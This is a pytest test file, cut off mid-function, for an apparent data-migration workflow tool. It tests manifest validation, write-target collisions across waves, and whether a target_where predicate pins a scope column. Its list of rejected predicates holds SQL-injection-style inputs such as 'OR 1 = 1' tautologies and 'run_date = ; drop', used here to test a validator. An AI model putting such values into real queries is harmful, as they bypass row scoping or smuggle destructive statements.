import ast
import asyncio
from collections import Counter
import datetime
import hashlib
import hmac
import json
import os
import re
import shlex
import subprocess
import sys
import urllib.parse
from pathlib import Path

import pytest


WORKFLOW = Path(__file__).with_name("workflow.py")
MODULES = [WORKFLOW, *(WORKFLOW.with_name(n) for n in ("decisions.py", "manifest.py", "report.py"))]


def _tree():
    """The workflow and the modules it imports from the plugin root, as one body."""
    return ast.Module(body=[n for p in MODULES for n in ast.parse(p.read_text()).body], type_ignores=[])


async def _stop_register_workflow(_meta):
    raise RuntimeError("stop")


def _functions():
    tree = _tree()
    selected = [node for node in tree.body
                if (isinstance(node, ast.FunctionDef)
                    and node.name in {"validate_manifest", "validate_verify", "protected_files_violations",
                                      "validate_gates", "check_write_targets", "other_wave_manifests",
                                      "unit_mapping", "bounded_readers", "target_key", "valid_namespace", "reads_target", "bounded_predicate",
                                      "column_key", "unit_dependencies", "transitive_writes", "check_dependencies",
                                      "mapped_target", "predicate_slices", "reader_slices", "disjoint_slices", "check_wave_tag",
                                      "check_pipelines_published", "_is_manifest", "validate_close", "check_pipeline_updates",
                                      "batch_verdicts", "merge_override_for", "skill_text", "check_repo_origin",
                                      "check_doctor_contract", "scope_covers", "override_forgives", "skill_file"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"VERIFY_DEPTHS", "GUARD_MODES", "UNIT_ID", "WORD", "BRIEF_MAX_CHARS",
                                                         "ENV_NAME", "PARAM_VALUE", "GATE_KINDS", "GATE_STATUSES",
                                                         "DECISION_ID", "TARGET_SURFACES", "SKILL_NAME", "_SEGMENT",
                                                         "PREDICATE_TOKEN", "PREDICATE_WORDS", "TAG_RE", "PIPELINE_RE",
                                                         "REPO_RE", "BARE_PATH"}
                    for t in node.targets))]
    namespace = {"Counter": Counter, "re": re, "hashlib": hashlib, "json": json, "Path": Path, "ROOT": Path("/nonexistent"), "BASE_BRANCH": "migration/estate",
                 "subprocess": subprocess, "sys": sys, "urllib": urllib, "PLUGIN": WORKFLOW.parents[2],
                 "MANIFEST": {"merge_overrides": []}}
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    validate = namespace["validate_manifest"]
    namespace["validate_manifest"] = lambda m, plugin=WORKFLOW.parents[2]: validate(m, plugin)
    return namespace


def _batch_runtime():
    tree = _tree()
    selected = [node for node in tree.body
                if (isinstance(node, ast.ClassDef) and node.name == "Breaker")
                or (isinstance(node, ast.AsyncFunctionDef) and node.name in {"run_batch", "_run_batch"})
                or (isinstance(node, ast.FunctionDef) and node.name in {"protected_files_violations", "prompt_sha",
                                                                         "merge_override_for", "gate_outcomes", "batch_max_minutes",
                                                                         "scope_covers", "override_forgives", "evidence_path", "skill_file"})
                or (isinstance(node, ast.Assign) and any(
                    isinstance(t, ast.Name) and t.id in {"MERGE_EVIDENCE_MODES", "DECISION_ID", "SKILL_NAME", "_SEGMENT",
                                                         "PREDICATE_TOKEN", "PREDICATE_WORDS", "BARE_PATH", "EVIDENCE_META",
                                                         "UNSCOPED_OVERRIDE"}
                    for t in node.targets))]
    namespace = {
        "asyncio": asyncio,
        "json": json,
        "unit_recon": lambda head, units: {u: (True, ["rerun_policy"]) for u in units},
        "evidence_in_pr": lambda head, path, units: bool(head) and any(path.startswith(f".migration/recon/{u}/") for u in units),
        "Counter": Counter,
        "hashlib": hashlib,
        "re": re,
        "MANIFEST": {"merge_overrides": [{"decision": "mo-u", "units": ["u"]}]},
        "MAX_MINUTES": 45,
        "CHILD_SCHEMA": {},
        "REPO": ".",
        "WorkflowAgentError": RuntimeError,
        "child_prompt": lambda batch: json.dumps(batch, sort_keys=True),
        "log": lambda message: None,
        "pr_changed_paths": lambda pr_url: ("c" * 40, []),
    }
    exec(compile(ast.Module(body=selected, type_ignores=[]), str(WORKFLOW), "exec"), namespace)
    return namespace


def test_validate_verify_missing_and_extra_verdicts():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "pr_url": "https://example/pr/3"}]
    missing = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {}, "findings": []}, passed)
    extra = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "PASS", "other": "PASS"},
                             "findings": []}, passed)
    assert "missing verdicts for w2-b03" in missing[0]
    assert any("unexpected verdicts" in problem for problem in extra)


def test_validate_verify_contradiction():
    validate_verify = _functions()["validate_verify"]
    passed = [{"batch": "w2-b03", "pr_url": "https://example/pr/3"}]
    problems = validate_verify({"wave_verdict": "PASS", "unit_verdicts": {"w2-b03": "FAIL"}, "findings": []}, passed)
    assert any("contradict" in problem for problem in problems)
    problems = validate_verify({"wave_verdict": "FAIL", "unit_verdicts": {"w2-b03": "PASS"}, "findings": []}, passed)
    assert any("contradict" in problem for problem in problems)


@pytest.mark.parametrize("value", [0, True, "3"])
def test_validate_manifest_rejects_invalid_positive_integer(value):
    validate_manifest = _functions()["validate_manifest"]
    manifest = {"wave": 1, "repo": "github.com/acme/target", "child_skill": "unit-migration",
                "verify_skill": "wave-verify", "plan_step": "run-wave-1",
                "batches": [{"id": "b", "units": ["u"],
                "write_targets": ["t"], "brief": "brief"}], "width": value,
                "base_branch": "migration/loan-servicing"}
    with pytest.raises(SystemExit, match="width"):
        validate_manifest(manifest)


@pytest.mark.parametrize("value", [0, True, "3"])
def test_validate_manifest_rejects_invalid_max_minutes(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="max_minutes"):
        validate_manifest(_manifest(max_minutes=value))
    batch_bad = _manifest()
    batch_bad["batches"][0]["max_minutes"] = value
    with pytest.raises(SystemExit, match="max_minutes"):
        validate_manifest(batch_bad)


@pytest.mark.parametrize("value", ["a b", "b-1 (held)", 7])
def test_validate_manifest_rejects_a_batch_id_that_is_not_a_plain_word(value):
    """A batch id is named on the six-line card and in every halt; a word, never a phrase."""
    m = _manifest()
    m["batches"][0]["id"] = value
    with pytest.raises(SystemExit, match="batch ids must be a plain word"):
        _functions()["validate_manifest"](m)


def test_validate_manifest_accepts_a_batch_max_minutes_override():
    m = _manifest()
    m["batches"][0]["max_minutes"] = 30
    _functions()["validate_manifest"](m)


def test_validate_manifest_accepts_target_state():
    _functions()["validate_manifest"](_manifest(target_state={
        "core": {"decision": "target-core", "target": "Delta table", "ref": "examples/core.sql"},
        "lakebase": {"decision": "target-lakebase", "na": "No operational data in this estate"},
    }))


def test_validate_manifest_rejects_unknown_target_state_surface():
    with pytest.raises(SystemExit, match="unknown surface"):
        _functions()["validate_manifest"](_manifest(target_state={
            "unknown": {"decision": "target-core", "target": "Delta table", "ref": "examples/core.sql"},
        }))


def test_validate_manifest_rejects_target_state_without_decision():
    with pytest.raises(SystemExit, match="decision"):
        _functions()["validate_manifest"](_manifest(target_state={
            "core": {"target": "Delta table", "ref": "examples/core.sql"},
        }))


def test_validate_manifest_rejects_target_state_with_target_and_na():
    with pytest.raises(SystemExit, match="either target/ref or na"):
        _functions()["validate_manifest"](_manifest(target_state={
            "core": {"decision": "target-core", "target": "Delta table", "ref": "examples/core.sql",
                     "na": "not applicable"},
        }))


def test_validate_manifest_rejects_empty_target_state():
    with pytest.raises(SystemExit, match="non-empty object"):
        _functions()["validate_manifest"](_manifest(target_state={}))


def test_validate_manifest_rejects_max_minutes_over_sixty():
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="max_minutes.*at most 60"):
        validate_manifest(_manifest(max_minutes=61))
    m = _manifest()
    m["batches"][0]["max_minutes"] = 61
    with pytest.raises(SystemExit, match="max_minutes.*at most 60"):
        validate_manifest(m)


@pytest.mark.parametrize("value", [0, True, "3", 1441])
def test_validate_manifest_rejects_invalid_doctor_max_age(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="doctor_max_age"):
        validate_manifest(_manifest(doctor_max_age=value))


def test_validate_manifest_accepts_doctor_max_age():
    _functions()["validate_manifest"](_manifest(doctor_max_age=15))


@pytest.mark.parametrize("value", [1, "true", {"x": 1}])
def test_validate_manifest_rejects_non_bool_degraded(value):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="degraded"):
        validate_manifest(_manifest(degraded=value))


def test_validate_manifest_accepts_degraded_bool():
    _functions()["validate_manifest"](_manifest(degraded=True))
    _functions()["validate_manifest"](_manifest(degraded=False))


@pytest.mark.parametrize("bad", ["a/b", 7, {"scope": "key"}])
def test_validate_manifest_rejects_non_list_secrets(bad):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="secrets"):
        validate_manifest(_manifest(secrets=bad))
    m = _manifest()
    m["batches"][0]["secrets"] = bad
    with pytest.raises(SystemExit, match="secrets"):
        validate_manifest(m)


def test_validate_manifest_accepts_list_of_string_secrets():
    m = _manifest(secrets=["app/k"])
    m["batches"][0]["secrets"] = ["app/k2"]
    _functions()["validate_manifest"](m)


CAPS = {"identity": "sp-1", "catalogs": ["mig"], "ready": True, "guard_mode": "block"}
HOST = "https://adb-1.azuredatabricks.net"


def _caps(**changes):
    return {**CAPS, **changes}


GATE = {"id": "g-rows", "kind": "row_parity", "status": "pending", "evidence": ""}


def _gated(batches):
    """Every manifest declares its gates in the plan; tests about other fields get one pending gate each."""
    return [{**b, "gates": b.get("gates", [dict(GATE)])} for b in batches]


def _manifest(**extra):
    m = {"wave": 1, "repo": "github.com/acme/target", "child_skill": "unit-migration", "verify_skill": "wave-verify",
         "plan_step": "run-wave-1",
         "capabilities": _caps(host=HOST),
         "base_branch": "migration/loan-servicing",
         "batches": [{"id": "b", "units": ["u"], "write_targets": ["t"], "brief": "brief"}]}
    m.update(extra)
    m["batches"] = _gated(m["batches"])
    return m


# ---------------------------------------------------------------- shared tables across waves (WS3.9)

B1 = {"id": "b-1", "units": ["u1"], "write_targets": ["mig.t"], "brief": "b"}
B2 = {"id": "b-2", "units": ["u2"], "write_targets": ["mig.t", "mig.other"], "brief": "b"}
SCOPE = ["run_date", "unit_id", "region", "run_id", "batch_id", "run date", "Date"]
BOUNDED = {"objects": [{"object": "mig.t", "root_table": "dbo.t", "key": ["id"], "scope_columns": SCOPE,
                        "root_where": "run_date = '${as_of}'", "target_where": "run_date = '${as_of}'"}]}
UNBOUNDED = {"objects": [{"object": "mig.t", "root_table": "dbo.t", "key": ["id"], "scope_columns": SCOPE}]}
PRIOR = {"objects": [{**BOUNDED["objects"][0], "root_where": "run_date = '${prior_as_of}'",
                      "target_where": "run_date = '${prior_as_of}'"}]}


def _others(*batches, namespace="", name="wave-1.json"):
    """The other_wave_manifests shape: each sibling wave carries its own target_namespace with its batches."""
    return {name: {"target_namespace": namespace, "batches": list(batches)}}


OTHERS = _others(B2)


def _specs(**by_unit):
    return lambda unit: by_unit.get(unit)


def test_same_wave_collision_still_halts_naming_both_batches():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"collision.*'mig.t'.*b-1.*b-2"):
        check([B1, B2], {}, _specs(u1=BOUNDED, u2=PRIOR))


@pytest.mark.parametrize("spec", [UNBOUNDED,
                                  {"objects": [{**UNBOUNDED["objects"][0], "target_where": ""}]},
                                  {"objects": [{**UNBOUNDED["objects"][0], "target_where": "  "}]},
                                  {"objects": [{**UNBOUNDED["objects"][0], "target_where": 1}]}])
def test_shared_table_across_waves_needs_a_bounded_target_where(spec):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([B1], _others(B2), _specs(u1=spec))


def test_shared_table_across_waves_passes_when_every_reader_is_bounded():
    check = _functions()["check_write_targets"]
    check([B1], _others(B2), _specs(u1=BOUNDED, u2=PRIOR))
    check([B1], _others({**B2, "write_targets": ["mig.other"]}), _specs())


def test_pipeline_manifests_with_overlapping_targets_halt_and_disjoint_ones_pass(tmp_path):
    fn = _functions()
    (tmp_path / "wave-p1-1.json").write_text(json.dumps({"batches": []}))
    (tmp_path / "wave-p2-1.json").write_text(json.dumps({"batches": [B2]}))
    others = fn["other_wave_manifests"](tmp_path, "wave-p1-1.json")
    assert "wave-p2-1.json" in others
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-p2-1\.json"):
        fn["check_write_targets"]([B1], others, _specs(u1=UNBOUNDED))
    (tmp_path / "wave-p2-1.json").write_text(json.dumps({"batches": [
        {**B2, "write_targets": ["mig.other"]}]}))
    others = fn["other_wave_manifests"](tmp_path, "wave-p1-1.json")
    fn["check_write_targets"]([B1], others, _specs())


def test_other_wave_manifests_skips_generated_wave_files(tmp_path):
    fn = _functions()
    (tmp_path / "wave-p1-1.json").write_text(json.dumps({"batches": [B1]}))
    (tmp_path / "wave-p1-1.merged.json").write_text(json.dumps({"base": "a" * 40, "merged": {"b-1": True}}))
    (tmp_path / "wave-p1-1.result.json").write_text(json.dumps({"wave": 1, "batches": [{"id": "b-1"}]}))
    (tmp_path / "wave-p1-1.doctor.json").write_text(json.dumps({"checks": []}))
    others = fn["other_wave_manifests"](tmp_path, "wave-p2-1.json")
    assert list(others) == ["wave-p1-1.json"]


def test_preflight_halts_until_every_declared_sibling_pipeline_has_published_a_manifest(tmp_path):
    """The collision check reads what is on disk, so a sibling whose manifest has not landed on the integration
    branch yet is invisible to it; the manifest names the pipelines the plan split, and launch waits until each
    has a manifest on origin and the disk matches origin."""
    check = _functions()["check_pipelines_published"]
    pipelines = {"orders": 1, "payments": 1, "wire": 1}
    orders = json.dumps({"batches": [B1], "pipelines": pipelines})
    (tmp_path / "wave-orders-1.json").write_text(orders)
    manifest = {"pipelines": pipelines}
    published = {"wave-orders-1.json": orders}
    with pytest.raises(SystemExit, match=r"wave-payments-1\.json, wave-wire-1\.json.*integration branch"):
        check(tmp_path, manifest, published)
    payments = json.dumps({"batches": [B2], "pipelines": pipelines})
    (tmp_path / "wave-payments-1.json").write_text(payments)
    published["wave-payments-1.json"] = payments
    published["wave-wire-2.json"] = json.dumps({"batches": [], "pipelines": pipelines})   # past the count
    with pytest.raises(SystemExit, match=r"wave-wire-1\.json"):
        check(tmp_path, manifest, published)
    published["wave-wire-1.json"] = json.dumps({"batches": [], "pipelines": pipelines})
    (tmp_path / "wave-wire-1.json").write_text(published["wave-wire-1.json"])
    with pytest.raises(SystemExit, match=r"wave-wire-2\.json.*plans disagree"):
        check(tmp_path, manifest, published)
    del published["wave-wire-2.json"]
    published["wave-payments-1.json"] = json.dumps(
        {"batches": [B2], "pipelines": {"orders": 1, "payments": 1, "wire": 2}})
    with pytest.raises(SystemExit, match="plans disagree"):
        check(tmp_path, manifest, published)
    for junk in ("[]", "not json"):
        published["wave-payments-1.json"] = junk
        with pytest.raises(SystemExit, match="plans disagree"):
            check(tmp_path, manifest, published)
    published["wave-payments-1.json"] = payments
    check(tmp_path, manifest, published)
    check(tmp_path, {}, published)
    with pytest.raises(SystemExit, match="billing"):
        check(tmp_path, {"pipelines": {"orders": 1, "billing": 1}}, published)


def test_only_wave_dash_files_are_manifests_on_origin(tmp_path):
    """The pointer file or any other JSON committed under waves/ is not a manifest origin holds and disk lacks."""
    is_manifest = _functions()["_is_manifest"]
    assert is_manifest("wave-orders-1.json") and is_manifest("wave-1.json")
    assert not is_manifest("current.json") and not is_manifest("wave-1.result.json")
    check = _functions()["check_pipelines_published"]
    orders = json.dumps({"batches": [B1], "pipelines": {"orders": 1}})
    (tmp_path / "wave-orders-1.json").write_text(orders)
    check(tmp_path, {"pipelines": {"orders": 1}}, {"wave-orders-1.json": orders, "current.json": "{}"})


def test_preflight_halts_on_a_manifest_origin_does_not_hold_or_holds_differently(tmp_path):
    """A manifest that is only local, or edited since it was pushed, is one no sibling can see."""
    check = _functions()["check_pipelines_published"]
    (tmp_path / "wave-orders-1.json").write_text(json.dumps({"batches": [B1]}))
    with pytest.raises(SystemExit, match=r"wave-orders-1\.json.*not on origin.*commit and push"):
        check(tmp_path, {}, {})
    with pytest.raises(SystemExit, match=r"wave-orders-1\.json.*differs from origin.*commit and push"):
        check(tmp_path, {}, {"wave-orders-1.json": json.dumps({"batches": [B2]})})
    (tmp_path / "wave-orders-1.result.json").write_text("{}")
    (tmp_path / "wave-orders-1.merged.json").write_text("{}")
    check(tmp_path, {}, {"wave-orders-1.json": json.dumps({"batches": [B1]})})


@pytest.mark.parametrize("bad", ["orders", [], {}, {"orders": 0}, {"orders": -1}, {"orders": True},
                                 {"orders": "2"}, {"orders": None}, {"orders/1": 2}, {7: 2},
                                 [["orders"]], [{"a": 1}]])
def test_validate_manifest_rejects_a_pipelines_map_that_does_not_name_each_pipeline_and_its_wave_count(bad):
    validate = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="'pipelines'"):
        validate({**_manifest(), "pipelines": bad})
    validate({**_manifest(), "pipelines": {"orders": 1, "payments_2": 3}})


def test_check_wave_tag_pins_the_file_name_number_to_the_manifest_wave():
    check = _functions()["check_wave_tag"]
    check("1", {"wave": 1})
    check("payments-1", {"wave": 1, "pipelines": {"payments": 1}})
    for tag, wave in [("2", 1), ("payments-1", 2), ("payments", 1)]:
        with pytest.raises(SystemExit, match="the wave number in the file name"):
            check(tag, {"wave": wave, "pipelines": {"payments": 2}})


def test_check_wave_tag_requires_a_tagged_manifest_to_list_its_pipelines():
    check = _functions()["check_wave_tag"]
    check("orders-1", {"wave": 1, "pipelines": {"orders": 2}})
    check("orders-2", {"wave": 2, "pipelines": {"orders": 2}})
    with pytest.raises(SystemExit, match=r"wave-<pipeline>-<N>\.json.*pipelines"):
        check("orders-1", {"wave": 1})
    with pytest.raises(SystemExit, match="orders"):
        check("orders-1", {"wave": 1, "pipelines": {"payments": 1, "wire": 1}})
    with pytest.raises(SystemExit, match="orders"):
        check("orders-3", {"wave": 3, "pipelines": {"orders": 2}})


@pytest.mark.parametrize("u2", [None, {"objects": []}, {"objects": [{"object": "mig.other", "target_where": "x = 1"}]}])
def test_shared_table_other_wave_unit_without_a_mapping_for_it_halts_too(u2):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-1\.json.*b-2.*units/u2/mapping_spec\.json"):
        check([B1], _others(B2), _specs(u1=BOUNDED, u2=u2))


def test_shared_table_other_wave_unbounded_mapping_also_halts():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"'mig.t'.*u2.*target_where"):
        check([B1], _others(B2), _specs(u1=BOUNDED, u2=UNBOUNDED))


@pytest.mark.parametrize("spec, message", [
    (None, "mapping_spec.json"),
    ({"objects": []}, "mig.t"),
    ({"objects": [{"object": "mig.other", "target_where": "x = 1"}]}, "mig.t"),
    ({"objects": "mig.t"}, "objects"),
    ([], "objects"),
])
def test_shared_table_current_unit_without_a_mapping_for_it_halts(spec, message):
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=message):
        check([B1], _others(B2), _specs(u1=spec))


def test_shared_table_matches_tables_key_and_target_table_spelling():
    check = _functions()["check_write_targets"]
    legacy = {"tables": [{"target_table": "MIG.T", "source_table": "dbo.t", "scope_columns": ["run_date"],
                          "target_where": "run_date = '${as_of}'"}]}
    check([B1], OTHERS, _specs(u1=legacy, u2=PRIOR))
    with pytest.raises(SystemExit, match="target_where"):
        check([B1], OTHERS, _specs(u1={"tables": [{"target_table": "MIG.T", "source_table": "dbo.t",
                                                  "scope_columns": ["run_date"]}]}, u2=PRIOR))


def test_shared_table_is_the_same_table_whatever_its_case_or_quoting():
    check = _functions()["check_write_targets"]
    with pytest.raises(SystemExit, match=r"collision.*b-1.*b-2"):
        check([B1, {**B2, "write_targets": ["MIG.T"]}], {}, _specs(u1=BOUNDED, u2=PRIOR))
    for other in ("MIG.T", "`mig`.`t`", " Mig.T "):
        with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*b-2.*u1.*target_where"):
            check([B1], _others({**B2, "write_targets": [other]}), _specs(u1=UNBOUNDED, u2=PRIOR))
        check([B1], _others({**B2, "write_targets": [other]}), _specs(u1=BOUNDED, u2=PRIOR))


BARE = lambda where: {"objects": [{"object": "T", "root_table": "dbo.t", "key": ["id"], "scope_columns": ["run_date"],
                                   "target_where": where}]}


@pytest.mark.parametrize("namespace", ["mig", "MIG", "`mig`", "cat.mig"])
def test_one_normalizer_qualifies_bare_names_with_the_manifest_target_namespace(namespace):
    """target_key is the one identity for manifests and mappings alike: a bare name is the table in the
    manifest's target_namespace (the catalog and schema the harness run is given), so `t`, `mig.t` and
    `cat.mig.t` are one target under `cat.mig` while `other.t` is not, in collisions and in readers."""
    fn = _functions()
    key, check = fn["target_key"], fn["check_write_targets"]
    full = "cat.mig.t" if namespace == "cat.mig" else "mig.t"
    assert key("t", namespace) == key("MIG.T", namespace) == key(full, namespace) == full
    assert key("other.t", namespace) != key("t", namespace) and key("ig.t", namespace) != key("t", namespace)
    assert fn["reads_target"]("T", "mig.t", namespace) and not fn["reads_target"]("other.t", "mig.t", namespace)
    for current, previous in (("t", "mig.t"), ("mig.t", "t"), ("T", full), (full, "t")):
        with pytest.raises(SystemExit, match=rf"'{re.escape(current)}'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
            check([{**B1, "write_targets": [current]}], _others({**B2, "write_targets": [previous]}, namespace=namespace),
                  _specs(u1=UNBOUNDED, u2=PRIOR), namespace)
        check([{**B1, "write_targets": [current]}], _others({**B2, "write_targets": [previous]}, namespace=namespace),
              _specs(u1=BARE("run_date = '${as_of}'"), u2=PRIOR), namespace)
    with pytest.raises(SystemExit, match=r"collision.*'(t|mig\.t)'.*b-1.*b-2"):
        check([{**B1, "write_targets": ["t"]}, B2], {}, _specs(u1=BOUNDED, u2=PRIOR), namespace)
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*target_where"):
        check([B1], _others(B2, namespace=namespace), _specs(u1=BARE(""), u2=PRIOR), namespace)
    for other in ("other.t", "ig.t"):
        with pytest.raises(SystemExit, match=r"no object reading 'mig.t'"):
            check([B1], _others(B2, namespace=namespace), _specs(u1={"objects": [{"object": other, "target_where": "id = 1"}]}, u2=PRIOR), namespace)
        check([B1], _others({**B2, "write_targets": [other]}, namespace=namespace), _specs(), namespace)


def test_each_wave_resolves_its_own_targets_with_its_own_target_namespace():
    """A bare write target means the table in the namespace of the manifest that declares it, so a sibling
    wave's targets are qualified with that wave's target_namespace, never this wave's: bare `t` under a
    sibling's `mig` is this wave's `mig.t` (shared), while bare `t` in two waves with different namespaces,
    or in a sibling with none, is two tables."""
    fn = _functions()
    check = fn["check_write_targets"]
    sibling_bare = _others({**B2, "write_targets": ["t"]}, namespace="mig")
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([B1], sibling_bare, _specs(u1=UNBOUNDED, u2=PRIOR))
    check([B1], sibling_bare, _specs(u1=BOUNDED, u2=PRIOR))
    check([B1], sibling_bare, _specs(u1=BOUNDED, u2=BARE("run_date = '${prior_as_of}'")))
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-1\.json.*b-2.*u2.*target_where"):
        check([B1], sibling_bare, _specs(u1=BOUNDED, u2=BARE("")))
    with pytest.raises(SystemExit, match=r"no object reading 'mig.t'"):
        check([B1], sibling_bare, _specs(u1=BOUNDED, u2={"objects": [{"object": "other.t", "target_where": "id = 1"}]}))
    check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}, namespace="mig_b"), _specs(), "mig_a")
    check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}), _specs(), "mig_a")
    check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}, namespace="mig"), _specs())
    with pytest.raises(SystemExit, match=r"'t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}), _specs(u1=BARE(""), u2=PRIOR))
    with pytest.raises(SystemExit, match=r"'t'.*b-1.*wave-1\.json.*b-2.*u1.*target_where"):
        check([{**B1, "write_targets": ["t"]}], _others({**B2, "write_targets": ["t"]}, namespace="mig"),
              _specs(u1=BARE(""), u2=PRIOR), "MIG")
    for shape in ([B2], {"batches": [B2]}, {"target_namespace": 1, "batches": [B2]},
                  {"target_namespace": "a b", "batches": [B2]}, {"target_namespace": "", "batches": B2}):
        with pytest.raises(SystemExit, match=r"wave-1\.json"):
            check([B1], {"wave-1.json": shape}, _specs(u1=BOUNDED, u2=PRIOR))


def test_without_a_target_namespace_a_bare_mapping_object_reads_the_qualified_table_of_its_name():
    """Manifests without a target_namespace still qualify their targets while the harness's mapping objects
    are often bare (the run supplies catalog and schema). Two manifest names stay distinct (`t` is not
    `mig.t`), but a bare object with no namespace to resolve in reads the shared table whose trailing name
    it is, case-folded, so it is held to a bound rather than escaping as a non-reader."""
    fn = _functions()
    assert fn["target_key"]("T") == "t" != fn["target_key"]("mig.t") and fn["target_key"]("MIG.T") == "mig.t"
    assert fn["reads_target"]("T", "mig.t") and fn["reads_target"]("`MIG`.T", "mig.t")
    assert fn["reads_target"]("mig.t", "T") and not fn["reads_target"]("other.t", "mig.t")
    assert not fn["reads_target"]("T", "mig.t", "cat") and not fn["reads_target"]("", "t")
    check = fn["check_write_targets"]
    check([B1], _others({**B2, "write_targets": ["t"]}), _specs())
    check([{**B1, "write_targets": ["t"]}, B2], {}, _specs())
    check([B1], OTHERS, _specs(u1=BARE("run_date = '${as_of}'"), u2=PRIOR))
    with pytest.raises(SystemExit, match=r"'mig.t'.*u1.*target_where"):
        check([B1], OTHERS, _specs(u1=BARE(""), u2=PRIOR))
    with pytest.raises(SystemExit, match=r"no object reading 'mig.t'"):
        check([B1], OTHERS, _specs(u1={"objects": [{"object": "other.t", "target_where": "id = 1"}]}, u2=PRIOR))


def test_only_the_units_whose_mappings_read_a_shared_table_must_bound_it():
    """A batch of several units writes a shared table through one of them; the others' mappings never name
    it and need no bound for it. A batch none of whose units read it has no scoped reader at all: halt."""
    check = _functions()["check_write_targets"]
    other = {"objects": [{"object": "mig.other", "root_table": "dbo.o", "key": ["id"]}]}
    b1 = {**B1, "units": ["u1", "u3"]}
    check([b1], _others({**B2, "units": ["u2", "u4"]}), _specs(u1=BOUNDED, u2=PRIOR, u3=other, u4=other))
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*b-2.*u1.*target_where"):
        check([b1], OTHERS, _specs(u1=UNBOUNDED, u2=PRIOR, u3=other))
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*no unit of b-1 .*reads"):
        check([b1], OTHERS, _specs(u1=other, u2=PRIOR, u3=other))
    with pytest.raises(SystemExit, match=r"'mig.t'.*wave-1\.json.*no unit of b-2 .*reads"):
        check([b1], _others({**B2, "units": ["u2", "u4"]}), _specs(u1=BOUNDED, u2=other, u3=other, u4=other))
    with pytest.raises(SystemExit, match=r"units/u3/mapping_spec\.json is missing"):
        check([b1], OTHERS, _specs(u1=BOUNDED, u2=PRIOR))


@pytest.mark.parametrize("namespace", [1, "", " ", "a b", "cat.", ".mig", "cat..mig", ["mig"]])
def test_target_namespace_when_present_is_a_dotted_identifier(namespace):
    validate_manifest = _functions()["validate_manifest"]
    with pytest.raises(SystemExit, match="target_namespace"):
        validate_manifest({**_manifest(), "target_namespace": namespace})
    validate_manifest({**_manifest(), "target_namespace": "cat.mig"})


@pytest.mark.parametrize("where", ["1 = 1", "1=1", "'a' = 'a'", "TRUE", "NOT (1 = 2)", "${as_of} = ${as_of}",
                                   "DATE '2024-01-01' < DATE '2024-01-02'", "run_date = '${as_of}' OR 1 = 1",
                                   "1 = 1 or (run_date = '${as_of}')", "x", "run_date = ; drop",
                                   "(run_date = '${as_of}' OR 1 = 1)", "((run_date = '${as_of}') OR (1 = 1))",
                                   "(unit_id = 'u1' OR 1 = 1) AND (1 = 1)", "NOT (run_date = '${as_of}' OR 1 = 1)",
                                   "(unit_id = 'u1' AND 1 = 1) OR 1 = 1", "(run_date = '${as_of}'", "run_date = '${as_of}')",
                                   "run_date = '${as_of}' OR", "AND run_date = '${as_of}'", "() OR run_date = '${as_of}'",
                                   "unit_id = unit_id", "run_date = t.run_date", "run_date IS NOT NULL", "run_date IS NULL",
                                   "run_date <> '${as_of}'", "run_date != '${as_of}'", "NOT run_date = '${as_of}'",
                                   "NOT (run_date = '${as_of}')", "NOT deleted_at IS NULL", "run_date LIKE '%'",
                                   "run_date = '${as_of}' OR run_date IS NULL", "run_date", "run_date = ",
                                   "deleted_at = '${as_of}'", "t.other = 1 AND 1 = 1", "run_date = '${as_of}' OR other = 1"])
def test_target_where_that_does_not_pin_a_scope_column_is_not_a_bound(where):
    fn = _functions()
    spec = {"objects": [{**UNBOUNDED["objects"][0], "target_where": where}]}
    assert not fn["bounded_predicate"](where, SCOPE)
    assert fn["bounded_readers"](spec, "mig.t") == "reads it without a target_where pinning one of its scope_columns"
    with pytest.raises(SystemExit, match=r"'mig.t'.*b-1.*b-2.*u1.*target_where"):
        fn["check_write_targets"]([B1], OTHERS, _specs(u1=spec, u2=PRIOR))


@pytest.mark.parametrize("where", ["run_date = '${as_of}'", "t.run_date = DATE '2024-01-01'", "batch_id IN (1, 2)",
                                   "unit_id = 'u1' AND 1 = 1", "(region = 'eu' OR region = 'us') AND run_id = ${run}",
                                   "[run date] = 1", '"Run"."Date" = 1', "RUN_DATE = '${as_of}'", "run_date > '${as_of}'",
                                   "run_date BETWEEN '2024-01-01' AND '2024-01-31'", "run_date = '${as_of}' AND deleted_at IS NULL",
                                   "1 = 1 AND (region = 'eu' OR (region = 'us' AND 1 = 1))", "((run_date = '${as_of}'))",
                                   "unit_id = 'u1' AND (region = 'eu' OR 1 = 1)", "unit_id LIKE 'u1%'", "run_date IN ('${as_of}')"])
def test_target_where_pinning_a_declared_scope_column_is_a_bound(where):
    fn = _functions()
